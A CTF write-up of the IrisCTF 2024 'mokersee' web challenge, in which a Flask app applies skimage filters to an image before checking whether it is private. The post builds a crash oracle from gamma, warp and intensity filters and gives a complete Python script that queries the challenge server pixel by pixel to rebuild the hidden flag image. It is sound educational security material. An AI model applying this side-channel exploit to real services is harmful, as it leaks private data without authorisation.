---
layout: post
title: mokersee | IrisCTF 2024
description: Side channel leaking an image through filter abuse!
author: Ronak Badhe
tags: web source
---

# Mokersee

> After last year, I decided the mokers have to stay local (since putting them on imgur was clearly the issue). In fact, you can't modify the site itself. No way you can read my flag now

Source:
- <https://cdn.2024.irisc.tf/mokersee.tar.gz>


![moker1](/assets/posts/imgur/SwNw2Ee.png)

## Analysis

We are given a flask app which allows us to see images of mokers given a moker's id. We can apply various transformations from `skimage` to the image to transform the image we see. Mokers can either be public or private. There are two mokers of interest:

* `flag` - a moker with a fake flag written in text on it, this moker is private
* `flagmoker` - the moker with the actual flag, this moker is public

Here is the moker with a fake flag. So cute.

![moker](/assets/posts/imgur/TQIRkvM.png)

Below is the api endpoint of interest:
```python
@app.route("/view/<moker>", methods=["GET"])
def view(moker):
    if moker not in MOKERS:
        return "What?"

    moker = MOKERS[moker]

    image = moker["blob"]

    filters = request.args.get("filters", None)
    if filters is not None:
        filters = json.loads(filters)
        image = np.array(image) / 255
        image = doFilterChain(image, filters)
        image = Image.fromarray((image * 255).astype(np.uint8), 'RGB')

    if moker["private"]:
        return "Not for public consumption."

    io = BytesIO()
    image.save(io, "PNG")
    io.seek(0)
    return send_file(io, mimetype='image/png')
```

The control flow for the endpoint is as follows:

1. apply filter to moker
2. if moker is private, send text back and return
3. send a moker with filter applied

This control flow seems very safe and sound, but there are two possible ways this can be insecure:
1. the library doing the filtering has a remote code execution vulnerability
2. it is possible to exfiltrate the picture with a side channel by crashing the app if certain conditions on the pixels are met

I did a quick github search on [skimage](https://github.com/scikit-image/scikit-image) for usages of `eval` or `pickle` (very common RCE vectors) but didn't find anything interesting. To pursue this further, I could have looked into `sys.audithook` but I decided that it would be better to investigate the other approach.

## Understanding Scikit-Image

Below is the relevant image processing code from the app:

```py
from skimage.filters import gaussian as blur
from skimage.exposure import adjust_gamma as gamma, rescale_intensity as intensity
from skimage.transform import resize, rotate, swirl, warp

FILTERS = {
        "blur": blur,
        "gamma": gamma,
        "intensity": lambda i, a, b: intensity(i, tuple(a), tuple(b)),
        "resize": resize,
        "rotate": rotate,
        "swirl": swirl,
        "warp": lambda i, m: warp(i, np.array(m))
}

import time
def doFilterChain(image, chain):
    for f in chain:
        image = FILTERS[f["filter"]](image, *f["args"])

    return image

```

We see the list of functions available to us, let us try to understand these functions and their behaviour better so we can make educated attempts at exploitation.

For berevity, I will only discuss the important functions.

### Gamma

Applying gamma with args of `100000` gives us:

![gamma](/assets/posts/imgur/LL4UUDa.png)

Gamma can allow us to separate the image into two colors: flag text and background. This could be useful as it makes distinguishing between flag and non-flag pixels easier.

Looking at the [adjust_gamma source code](https://github.com/scikit-image/scikit-image/blob/441fe68b95a86d4ae2a351311a0c39a4232b6521/skimage/exposure/exposure.py#L620-L681), we see something interesting:

```python
def adjust_gamma(...):
    ...
    if gamma < 0:
        raise ValueError("Gamma should be a non-negative real number.")

    dtype = image.dtype.type

    if dtype is np.uint8:
        out = _adjust_gamma_u8(image, gamma, gain)
    else:
        _assert_non_negative(image)

        scale = float(dtype_limits(image, True)[1]
                      - dtype_limits(image, True)[0])

        out = (((image / scale) ** gamma) * scale * gain).astype(dtype)

    return out
```

where `_assert_non_negative()` is:

```python
def _assert_non_negative(image):
    if np.any(image < 0):
        raise ValueError('Image Correction methods work correctly only on '
                         'images with non-negative values. Use '
                         'skimage.exposure.rescale_intensity.')

```

This means that we can cause an exception if any rgb of any pixel in the image is negative.

The behaviour can be used as an oracle in a side channel to make the app either crash if a pixel is negative or succeed if a pixel is positive.

### Intensity

From skimage docs example:

```python
>>> rescale_intensity(image, out_range=(0, 127)).astype(np.int8)
array([  0,  63, 127], dtype=int8)
```

`rescale_intensity` allows us to scale an image's pixel values to an arbritrary range. Testing it out locally, it allows us to scale pixel values to be negative. This can be useful to cause the pre-condition of `adjust_gamma` crashing.

### Warp

> Warp an image according to a given coordinate transformation.
> 
> -- skimage docs

With `warp`, we specify a 2d homogenous matrix to apply as a linear transform to the image. Finally! What I learned in graphics class is coming in handy!

A 2d homogenous matrix is a 3x3 matrix that transforms a 2d homogenous vector. For example:

```
A = [1 0 5]
    [0 1 6]
    [0 0 1]
b = [2]
    [3]
    [1]
```

The multiplication `Ab` will translate point `b` at `(2, 3)` over by `5` units in the `x` dimension and `6` units in the `y` dimension.

We can see it by translating the fake flag moker.

Below I gave a homogenous matrix to translate the moker to the right by 100px:

![mokerright](/assets/posts/imgur/eYiGG6w.png)

Using a homogenous matrix below:

```
[1/100   0        x]
[0       1/1000   y]
[0       0        1]
```

We can turn the image into only the color of the pixel at `(x,y)`. This will be useful for isolating a single pixel.

## Exploit

To check whether a certain pixel is a flag pixel or not, we can do the following filter pipeline:

1. make image black/red only with a huuuuuge `gamma`
2. use a `warp` to only get data on a specific pixel
3. transform `intensity` such that `0` is mapped to `1` and `1` is mapped to `-0.2`, this has the effect of causing red pixels to have negative pixel values
4. apply a `gamma`, if it crashes the app, the pixel is red, otherwise, the pixel is black

We can then apply this function to all pixels of the image.

The exploit was taking way too long to run locally as image processing is expensive and takes a while. To reduce the amount of queries we have to make, I had it only calculate the pixel value for every 10th x/y coordinate (thus resulting in only `100^2` queries). 

Following is my exploit:

```python
import requests
import os
import orjson
import numpy as np
from PIL import Image
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm

url = "https://mokersee-web.chal.irisc.tf/view/flagmoker"
# url = "http://0.0.0.0:1337/view/flag"

def is_on(x, y):
    mult = 1/1000
    warper = [
        [mult, 0, x],
        [0, mult, y],
        [0, 0, 1]
    ]

    filters = [
        {"filter": "gamma", "args": [1000000]}, # make image black/red
        {"filter": "warp", "args": [warper]},
        {"filter": "intensity", "args": [[0., 1.], [1.0, -0.2]]},
        {"filter": "gamma", "args": []}
    ]
    filters = orjson.dumps(filters).decode()

    r = requests.get(url, params={"filters": filters})
    try:
        r.raise_for_status()
        return False
    except:
        return True

img = np.zeros((1000, 1000, 3))

with ThreadPoolExecutor(20) as pool:
    for x in tqdm(range(0, 1000, 10)):
        def work(y):
            img[x][y][:] = 1.0 if is_on(x, y) else 0.0
        [*pool.map(work, range(0, 1000, 10))]


img = Image.fromarray((img * 255).astype(np.uint8), "RGB")
with open("owo.png", "wb+") as fout:
    img.save(fout, "PNG")
os.system("qimgv owo.png")
```

It took 18 minutes to run so I left the computer for a while and when I came back, I was greeted with an image.

I used my image editor to apply some rotations and flips to the image to orient it correctly (I think my code transposes the image lol) and got:

![flag](/assets/posts/mokersee/flag.png)

It reads the flag `irisctf{all_i_did_was_add_some_floats}`

Want to say thank you to the organizers for this fun challenge!

Also, this challenge is my first web "first blood" where I solve the challenge before any other team!
